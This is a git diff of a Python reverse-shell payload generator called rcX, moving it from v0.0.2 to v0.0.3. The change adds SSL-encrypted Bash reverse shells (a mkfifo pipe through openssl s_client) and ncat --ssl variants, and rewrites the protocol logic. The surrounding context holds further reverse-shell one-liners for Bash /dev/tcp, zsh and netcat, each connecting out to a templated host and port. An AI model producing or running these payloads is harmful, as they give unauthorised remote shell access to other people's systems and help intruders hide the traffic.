@@ -1,18 +1,16 @@
 # coding=utf8
 __Author__ = 'FlyfishSec'
-__Version__ = 'v0.0.2'
+__Version__ = 'v0.0.3'
 __SITE__ = 'https://github.com/FlyfishSec/rcX'
 __Description__ = ''''''
 
 __Release_Notes__ = '''
 ✨ New Features
- + 
+ + Add bash ssl shell
 🎨 Improvements
  + 
-
 🐛 Bug fixes
- + Fix web mode ip obfuscator not working
-
+ + 
 '''
 
 __BANNERS__ = ['''
@@ -144,6 +142,11 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
                 "Bash5": "{shell_path} -i 5<> /dev/{protocol}/{host}/{port} 0<&5 1>&5 2>&5",
                 "zsh": "zsh -c 'zmodload zsh/net/tcp && ztcp {host} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
             },
+            "bash-ssl": {
+                "Bash-i": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell_path} -i 2>&1|openssl s_client -quiet -connect {host}:{port} >/tmp/f",
+                "Bash-l": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell_path} -l 2>&1|openssl s_client -quiet -connect {host}:{port} >/tmp/f",
+                "Bash-p": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell_path} -p 2>&1|openssl s_client -quiet -connect {host}:{port} >/tmp/f",
+            },
             "netcat": {
                 "nc": "{binary_name} -e {shell_path} {host} {port}{nc_args}",
                 "nc-c": "{binary_name} {host} {port} -c {shell_path}{nc_args}",
@@ -152,6 +155,10 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
                 "nc-mkfifo-linux": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell_path} -i 2>&1|{binary_name} {host} {port} >/tmp/f",
                 "nc-mknod-linux": "rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|{shell_path} -i 2>&1|{binary_name} {host} {port} >/tmp/f",
                 "DotnetCat": "dncat -e {shell_path} {host} -p {port}"
+            },
+            "netcat-ssl": {
+                "ncat": "ncat -e {shell_path} {host} {port} --ssl",
+                "ncat-c": "ncat -c {shell_path} {host} {port} --ssl",
             },
             "telnet": {
                 "telnet-two_ports-linux": "{binary_name} {host} {port}|{shell_path}|telnet {host} {port2}",
@@ -267,21 +274,27 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
     }
 
     payloads_dict = {}
-    # format payload
     nc_args = ncat_args = pwncat_args = socat_args = gotty_args = ""
     if "windows" in platform:
         socat_args = ",pipes"
 
     try:
-        if protocol.lower() == "udp":
-            nc_args = ncat_args = pwncat_args = " -u"
-        elif protocol.lower() == "https" or encryption == "ssl":
-            ncat_args = " --ssl"
+        protocol = protocol.lower()
+        if protocol == "udp":
+            if shell_type == "netcat":
+                nc_args = ncat_args = pwncat_args = " -u"
+        elif protocol == "https" or encryption == "ssl":
+            if shell_type == "bash":
+                shell_type = "bash-ssl"
+                protocol = "https"
+            elif shell_type == "netcat":
+                shell_type = "netcat-ssl"
+                protocol = "https"
+        elif shell_type == "bash" and protocol not in ["tcp", "udp", "https"]:
+            protocol = "tcp"
+
     except AttributeError:
         pass
-
-    if shell_type == "bash" and protocol.lower() not in ["tcp", "udp"]:
-        protocol = "tcp"
 
     # Mapping shell type to binary name
     binary_names = {"netcat": "nc", "nodejs": "node", "golang": "go"}
@@ -293,7 +306,7 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
         else:
             binary_name = shell_type
 
-            # format payload
+    # format payload
     if direction in templates and shell_type in templates[direction]:
         for name, payload in templates[direction][shell_type].items():
             if dec_ip and name not in ["ncat", "ncat-c"]:
@@ -1911,7 +1924,6 @@ def create_app(host="127.0.0.1", port=80, debug=False):
 
     @app.route("/gen", methods=["GET", "POST"])
     def gen():
-        # print("form", request.form)
         _host = request.form.get("host")
         _port = request.form.get("port")
         shell_type = request.form.get("shell_type")
